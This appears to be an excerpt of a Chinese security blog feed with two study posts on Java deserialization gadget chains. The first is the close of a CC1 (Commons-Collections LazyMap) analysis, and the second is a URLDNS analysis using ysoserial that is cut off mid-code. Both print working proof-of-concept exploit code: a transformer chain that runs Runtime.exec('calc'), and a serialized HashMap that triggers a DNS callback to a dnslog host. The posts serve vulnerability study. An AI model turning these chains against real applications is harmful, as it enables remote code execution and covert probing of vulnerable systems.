Map(Proxy).entrySet()</span><br><span class="line">                    AnnotationInvocationHandler.invoke()</span><br><span class="line">                        LazyMap.get()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                                ConstantTransformer.transform()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Class.getMethod()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.getRuntime()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure><h3 id="构造POC-1"><a href="#构造POC-1" class="headerlink" title="构造POC"></a>构造POC</h3><p>POC的前半段依旧采用TransformedMap利用链的代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br></pre></td></tr></table></figure><p>将传参入口变更至LazyMap类中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map Lmap = LazyMap.decorate(map, transformerChain);</span><br></pre></td></tr></table></figure><p>同<code>TransformedMap</code>利用链一样通过反射调用<code>AnnotationInvocationHandler</code>类，然后调用InvocationHandler代理调用<code>AnnotationInvocationHandler</code>类的构造函数传入参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//反射调用AnnotationInvocationHandler类</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(true);</span><br><span class="line">//创建代理InvocationHandler对象调用AnnotationInvocationHandler类</span><br><span class="line">        InvocationHandler invohandler=(InvocationHandler)declaredConstructor.newInstance(Generated.class,Lmap);</span><br></pre></td></tr></table></figure><p>然后创建<code>proxy</code>代理对象，参数分别为<code>Map加载器</code>、<code>Map类数组</code>、<code>InvocationHandler对象invohandler</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,invohandler);</span><br></pre></td></tr></table></figure><p>再通过代理调用代理对象，执行<code>AnnotationInvocationHandler.invoke</code>方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">InvocationHandler invohandlerproxy=(InvocationHandler)declaredConstructor.newInstance(Generated.class,proxymap);</span><br></pre></td></tr></table></figure><p>最后就是对<code>InvocationHandler</code>对象进行序列化，再反序列化触发漏洞</p><p>得到最终POC：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        <span class="comment">//反射调用AnnotationInvocationHandler类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//创建代理InvocationHandler对象调用AnnotationInvocationHandler类</span></span><br><span class="line">        InvocationHandler invohandler=(InvocationHandler)declaredConstructor.newInstance(Generated.class,Lmap);</span><br><span class="line">        <span class="comment">//创建proxy代理对象，参数分别为Map加载器、Map类数组、InvocationHandler对象invohandler</span></span><br><span class="line">        Map proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invohandler);</span><br><span class="line">        <span class="comment">//通过代理调用代理对象，执行invoke方法</span></span><br><span class="line">        InvocationHandler invohandlerproxy=(InvocationHandler)declaredConstructor.newInstance(Generated.class,proxymap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化InvocationHandler对象</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;exp.ser&quot;</span>));</span><br><span class="line">        out.writeObject(invohandlerproxy);</span><br><span class="line">        <span class="comment">//反序列化触发漏洞</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;exp.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/dd664be3/cc1-42.png" title="执行POC"></p><h1 id="0x05、总结"><a href="#0x05、总结" class="headerlink" title="0x05、总结"></a>0x05、总结</h1><p>整体来说就是找到能够执行恶意函数的方法，然后一步步查看调用链，最后找到反序列化入口，cc1链看下来就比URL链复杂很多，链路调用步骤多了很多，有些链的类还需要明白怎么实现的，LazyMap加了动态代理然后调用链更绕。<br>分析单从完整利用链来推导相对容易很多，但会错过很多细节以及实现原理，可能会导致当时看完明白了过后过了段时间再回想就没法理清完整的利用链，这次分析的过程花费了不少的时间，中间有很多原理细节琢磨了有点久，只是记了我认为需要细理解的地方，可能还有些小细节没些或者被跳过了没注意，后面再看到的话再补充进来吧。</p><h1 id="0x06、参考链接"><a href="#0x06、参考链接" class="headerlink" title="0x06、参考链接"></a>0x06、参考链接</h1><p><a href="https://paper.seebug.org/1242/#commonscollections-1">https://paper.seebug.org/1242/#commonscollections-1</a><br>P牛-Java漫谈</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-URLDNS链学习与分析</title>
      <link href="/posts/643c7e53.html"/>
      <url>/posts/643c7e53.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>延伸java序列化和java反射的内容，针对一些gadget利用链的一些学习，理解一下利用链的分析过程。<br>本文学习URLDNS反序列化链，也是java反序列化利用链里面最简单的一条，也利用java反序列化和反射的相关知识，可把前两篇java基础学习的知识运用在利用链里面，记录下利用链相关知识点。</p><p>本文角度两个方面，一是从ysoserial工具利用URLDNS角度分析学习，另一个角度是从URLDNS利用链分析学习。</p><h1 id="0x01、URLDNS链简述"><a href="#0x01、URLDNS链简述" class="headerlink" title="0x01、URLDNS链简述"></a>0x01、URLDNS链简述</h1><p>URLDNS是JAVA复杂的反序列化链中最简单的一条，它不是一条真正意义上的“利⽤链”。因为它所能产生的结果<font color="red">不是命令执⾏</font>，⽽是<font color="red">⼀次DNS请求</font>。</p><p>URLDNS通常用于快速监测是否存在反序列化漏洞，尤其对<strong>无回显的漏洞检测</strong>，原因：</p><ul><li>只依赖原生类</li><li>不限制jdk版本</li></ul><p>也就是说URLDN可直接调用java内置库即可进行操作，无需依赖其他第三方组件，同时不限制jdk版本不通带来的语言代码差异。</p><p>URLDNS链主要问题产生于HashMap,<font color="red">HashMap重写了readObject()反序列化方法，并且参数可控导致序列化漏洞</font>。</p><blockquote><p>HashMap简单介绍:<br>HashMap 是一个散列表，它存储的内容是键值对(key-value)映射。<br>HashMap 实现了 Map 接口，根据键的 HashCode 值存储数据，具有很快的访问速度，最多允许一条记录的键为 null，不支持线程同步。<br>HashMap 是无序的，即不会记录插入的顺序。<br>HashMap 继承于AbstractMap，实现了 Map、Cloneable、java.io.Serializable 接口。</p></blockquote><h1 id="0x02、yso-URLDNS利用链分析"><a href="#0x02、yso-URLDNS利用链分析" class="headerlink" title="0x02、yso-URLDNS利用链分析"></a>0x02、yso-URLDNS利用链分析</h1><h2 id="ysoserial环境准备"><a href="#ysoserial环境准备" class="headerlink" title="ysoserial环境准备"></a>ysoserial环境准备</h2><p>运行环境：idea<br>java环境: jdk8<br>漏洞环境：ysoserial(<a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a>)</p><p>idea相关配置:<br>下载ysoserial漏洞环境后在idea打开项目，idea会自动同步pom.xml中的依赖，注意的点是，需要更改文件-项目结构-项目设置-项目中的sdk版本和sdk默认值，如下图即可，不然在编译上可能会报错。随后构建项目即可。</p><p><img src="/posts/643c7e53/url-1.png" title="项目结构"><br><img src="/posts/643c7e53/url-2.png" title="java环境"></p><p>通过pol.xml知道主程序位置</p><p><img src="/posts/643c7e53/url-4.png" title="主程序"></p><p>在运行或者debug调试GeneratePayload.java文件，出现下面红色提示表示运行正常，项目部署成功，便可进行urldns链测试。</p><p><img src="/posts/643c7e53/url-3.png" title="运行部署"></p><p>运行-编辑配置里输入测试参数</p><p><img src="/posts/643c7e53/url-7.png" title="运行部署"></p><p>相当于使用主程序直接执行命令</p><p><img src="/posts/643c7e53/url-5.png" title="URLDNS序列化数据"></p><h2 id="yso-URLDNS链分析"><a href="#yso-URLDNS链分析" class="headerlink" title="yso-URLDNS链分析"></a>yso-URLDNS链分析</h2><p>yso生成URLDNS利用的序列化数据，主要为<code>URLDNS</code>、<code>url</code>两个参数</p><p><img src="/posts/643c7e53/url-5.png" title="URLDNS序列化数据"></p><p>在主程序获取参数下断点</p><p><img src="/posts/643c7e53/url-6.png" title="断点"></p><p>进行debug调试，参数<code>args[0]</code>即URLDNS传递给<code>payloadType</code>变量，参数<code>args[1]</code>即url传递给<code>command</code>变量</p><p><img src="/posts/643c7e53/url-8.png" title="断点"></p><p>获取Class类对象，类为<code>GeneratePayload.class.getPackage().getName() + &quot;.payloads.&quot; + className</code>对应得就是<code>ysoserial.payloads.URLDNS</code>类</p><p><img src="/posts/643c7e53/url-10.png" title="获取类对象"></p><p>对应返回给<code>payloadClass</code>对象</p><p><img src="/posts/643c7e53/url-11.png" title="获取类对象"></p><p>接下来对<code>Class对象</code>进行实例化</p><p><img src="/posts/643c7e53/url-12.png" title="实例化"></p><p>跟进<code>getObject()</code>方法，传递command参数也就是传入的url参数</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">               <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">               <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">               <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">               <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">               <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">               ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">               Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">               <span class="keyword">return</span> ht;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/643c7e53/url-13.png" title="getObject方法"></p><p>getObject方法中建立了<code>URLStreamHandler</code>流对象和<code>HashMap</code>对象,其中handler对象为<code>URLStreamHandler</code>的子类<code>SilentURLStreamHandler</code><br><code>URLStreamHandler handler = new SilentURLStreamHandler();</code><br>这次调用的子类<code>SilentURLStreamHandler</code>方法，去规避生成序列化的过程中触发dns，因为调用子类在获取<code>getHostAddress</code>方法时返回<code>Null</code>,并不执行父类<code>URLStreamHandler</code>中的<code>getHostAddress()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>生成<code>URL对象</code>，并将<code>url参数</code>和<code>URLStreamHandler</code>传入<code>URL对象</code>中</p><p><img src="/posts/643c7e53/url-14.png" title="建立对象"></p><p>随后执行<code>HashMap</code>的<code>put()</code>方法,将<code>URL对象</code>作为<code>HashMap值</code>，将<code>url参数值</code>作为<code>key的值</code>存储在<code>HashMap</code>中<br><code>ht.put(u, url);</code><br>再通过反射机制将<code>URL对象</code>的<code>hashCode值</code>设置为-1<br><code>Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);</code></p><p><img src="/posts/643c7e53/url-15.png" title="调用反射机制"></p><p>最后返回HashMap对象ht</p><p><img src="/posts/643c7e53/url-16.png" title="返回HashMap对象"></p><p>在获取HashMap对象后对其进行序列化操作，这边没有设置out定向输出的文件，out就没对应数值,对应命令行最后加<code> &gt; serialize.ser</code>。</p><p><img src="/posts/643c7e53/url-17.png" title="序列化操作"></p><p>由于<code>HashMap</code>对序列化<code>writeObject()</code>也进行了重写，所以会调用<code>HashMap</code>的序列化方法进行序列化操作，正常的序列化操作。</p><p><img src="/posts/643c7e53/url-18.png" title="序列化操作"></p><p>遍历<code>HashMap</code>中<code>key</code>和<code>value</code>进行序列化写入</p><p><img src="/posts/643c7e53/url-19.png" title="序列化操作"></p><p>到此ysoserial工具的URLDNS利用链就执行完成，输出payload序列化的数据。</p><p><img src="/posts/643c7e53/url-20.png" title="生成序列化文件"></p><h2 id="yso-URLDNS链反序列化"><a href="#yso-URLDNS链反序列化" class="headerlink" title="yso-URLDNS链反序列化"></a>yso-URLDNS链反序列化</h2><p>通过对输出的序列化数据，进行反序列化，触发漏洞。</p><p><img src="/posts/643c7e53/url-21.png" title="反序列化触发漏洞"><br><img src="/posts/643c7e53/url-22.png" title="DNSLOG接受到数据"></p><p><strong>payload</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream obj=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;C:\\Users\\OKAY\\Desktop\\java-web\\ysoserial\\payload.ser&quot;</span>));</span><br><span class="line">        obj.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03、URLDNS链反序列化分析"><a href="#0x03、URLDNS链反序列化分析" class="headerlink" title="0x03、URLDNS链反序列化分析"></a>0x03、URLDNS链反序列化分析</h1><h2 id="正常反序列化readObject阶段"><a href="#正常反序列化readObject阶段" class="headerlink" title="正常反序列化readObject阶段"></a>正常反序列化readObject阶段</h2><p>这里就跟着payload的反序列化进行分析下去吧，（当然也可以直接在HashMap重写的readObject方法进行下断点，可以直接分析反序列化触发的漏洞），这里从头来可以理解一下运行流程，但前些正常的反序列化过程比较长有些就略过了，记录下关键的步入点吧。<br>反序列化处下断点，debug运行</p><p><img src="/posts/643c7e53/url-30.png" title="下断点"></p><p>运行后，需要强行步入（Alt+Shift+F7）readObject方法，注：步入会直接跳过<br>进入后，还需要再次强行步入进入readObject方法</p><p><img src="/posts/643c7e53/url-31.png" title="readObject方法"></p><p>进入后，前面都是正常的一些判断，步过直到调用<code>readObject0()</code>方法</p><p><img src="/posts/643c7e53/url-31.png" title="readObject0方法"><br><img src="/posts/643c7e53/url-32.png" title="readObject0方法"></p><p>进入readObject0()方法，然后又是一系列的正常操作和判断，再关注到TC的判断如下图，由于TC为Obeject对象，并非String类对象，所以判断为false，进入调用readOrdinaryObject方法（读取二进制数据）</p><p><img src="/posts/643c7e53/url-33.png" title="readObject0方法"></p><p>进入readOrdinaryObject方法，这里读取序列化数据，并将序列化数据赋值给对象</p><p><img src="/posts/643c7e53/url-34.png" title="readOrdinaryObject方法"></p><p>后面将对象进行实例化并进行一些判断操作，一直到进入<code>readSerialData</code>方法</p><p><img src="/posts/643c7e53/url-35.png" title="readOrdinaryObject方法"><br><img src="/posts/643c7e53/url-36.png" title="readSerialData方法"></p><p><code>readSerialData</code>方法对序列化数据进行读取，一直到调用<code>invokeReadObject</code>方法</p><p><img src="/posts/643c7e53/url-38.png" title="invokeReadObject方法"></p><p>通过反射invoke去判断对象是否有重写readObject方法</p><p><img src="/posts/643c7e53/url-39.png" title="invokeReadObject方法"><br><img src="/posts/643c7e53/url-40.png" title="invokeReadObject方法"></p><p>返回<code>ma.invoke</code>，跟进查看<code>ma.invoke</code></p><p><img src="/posts/643c7e53/url-41.png" title="invokeReadObject方法"></p><p>返回<code>delegate.invoke</code>,跟进<code>delegate.invoke</code>方法</p><p><img src="/posts/643c7e53/url-42.png" title="invokeReadObject方法"></p><p>获得返回<code>HashMap</code>重写的<code>readObject</code>方法</p><p><img src="/posts/643c7e53/url-43.png" title="invokeReadObject方法"></p><p>跟进返回的<code>invoke0</code>,便进入调用的<code>HashMap</code>重写的<code>readObject</code>方法<br>到这里，进入<code>HashMap</code>重写的<code>readObject()</code>方法</p><p><img src="/posts/643c7e53/url-23.png" title="重写的readObject()方法"></p><h2 id="HashMap反序列化readObject阶段"><a href="#HashMap反序列化readObject阶段" class="headerlink" title="HashMap反序列化readObject阶段"></a>HashMap反序列化readObject阶段</h2><p>遍历<code>HashMap</code>中<code>key</code>和<code>value</code>的值，并反序列化读取还原<code>key</code>和<code>value</code>的值，随后进行<code>hash()</code>运算保证唯一</p><p><img src="/posts/643c7e53/url-24.png" title="获取key和value值"></p><p>跟进<code>hash()</code>,hash方法判断key是否为空，不为空就调用<code>URL</code>类中的<code>hashcode()</code>方法，key值为url如下图标识所示</p><p><img src="/posts/643c7e53/url-25.png" title="hash()方法"></p><p>跟进当前<code>hashcode()</code>方法，会首先判断hashcode是否为-1,为-1则进入<code>URLStreamHandler流对象的hashcode()</code>方法</p><p><img src="/posts/643c7e53/url-26.png" title="hashcode()方法"></p><p>流对象的<code>hashcode()</code>调用了<code>getHostAddress()</code>方法</p><p><img src="/posts/643c7e53/url-27.png" title="hashcode()方法"></p><p>跟进<code>getHostAddress()</code>方法，返回URL类的<code>u.getHostAddress()</code>方法</p><p><img src="/posts/643c7e53/url-28.png" title="getHostAddress()"></p><p>跟进<code>u.getHostAddress()</code>方法，调用<code>getByName()</code>从而解析请求dnslog，导致漏洞触发。</p><p><img src="/posts/643c7e53/url-44.png" title="dnslog请求"><br><img src="/posts/643c7e53/url-29.png" title="dnslog请求"></p><p>到此URLDNS链的反序列化触发访问dnslog就完成。</p><h2 id="总结URLDNS反序列化链流程"><a href="#总结URLDNS反序列化链流程" class="headerlink" title="总结URLDNS反序列化链流程"></a>总结URLDNS反序列化链流程</h2><ol><li><code>ObjectInputStream</code>读取<code>HashMap</code>的序列化文件</li><li>通过正常<code>Object</code>流<code>readObject</code>反序列化文件获取二进制数据</li><li>对二进制序列化数据进行读取并建立实例对象</li><li>通过对实例对象判断是否存在重写方法</li><li>获取到<code>HashMap</code>对象重写反序列化<code>readObject</code>方法，跳转执行该对象的<code>readObject</code>方法。</li><li>遍历序列化<code>Key</code>和<code>value</code>值，进行<code>hash</code>运算</li><li><code>hash</code>方法中<code>key</code>不为空时，调用<code>URL</code>类的<code>hashcode</code>方法</li><li>当<code>hashcode</code>等于-1时，调用<code>URLStreamHandler</code>流的<code>hashcode</code>方法</li><li><code>hashcode</code>方法中调用了<code>getHostAddress()</code>方法</li><li><code>getHostAddress()</code>方法返回<code>URL</code>类的<code>u.getHostAddress()</code>,</li><li><code>URL</code>类的<code>getHostAddress()</code>方法调用<code>getByName()</code>方法从而解析请求dns</li></ol><p><strong>其中步骤1-5为正常反序列化的读取步骤，6-11为获取HashMap对象执行重写readObject方法步骤。</strong></p><h1 id="0x04、POC编写"><a href="#0x04、POC编写" class="headerlink" title="0x04、POC编写"></a>0x04、POC编写</h1><p>通过上述过程可以理出来代码重要步骤。<br>主要生成HashMap对象和URL对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">URL u=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://yuk9sy.dnslog.cn&quot;</span>);</span><br></pre></td></tr></table></figure><p>并通过反射控制URL类中hashcode的值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">code</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashcode&quot;</span>);  <span class="comment">//通过反射去控制hashcode值</span></span><br><span class="line">       code.setAccessible(<span class="literal">true</span>); <span class="comment">//突破封装访问私有变量</span></span><br></pre></td></tr></table></figure><p>放入hashMap put值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hm.put(u,<span class="number">123</span>);  <span class="comment">//设置HashMap键值对</span></span><br></pre></td></tr></table></figure><p>通过设置hashcode为-1去触发dns请求</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">code.set(code,-<span class="number">1</span>);  <span class="comment">//通过设置hashcode为-1去触发dns请求</span></span><br></pre></td></tr></table></figure><p>然后就是序列化HashMap对象，最后反序列化。<br>完整POC：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">//创建HashMap对象</span></span><br><span class="line">        URL u=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://yuk9sy.dnslog.cn&quot;</span>); <span class="comment">//创建URL对象</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">code</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashcode&quot;</span>);  <span class="comment">//通过反射去控制hashcode值</span></span><br><span class="line">        code.setAccessible(<span class="literal">true</span>); <span class="comment">//突破封装访问私有变量</span></span><br><span class="line">        code.set(code,<span class="number">1</span>); <span class="comment">//将hashcode设置不为-1，避免在序列化生成过程触发dns</span></span><br><span class="line">        hm.put(u,<span class="number">123</span>);  <span class="comment">//设置HashMap键值对</span></span><br><span class="line">        code.set(code,-<span class="number">1</span>); <span class="comment">//将hashcode值设置为-1 , 确保在反序列化的时候触发dns</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//序列化过程</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./payload.ser&quot;</span>));</span><br><span class="line">            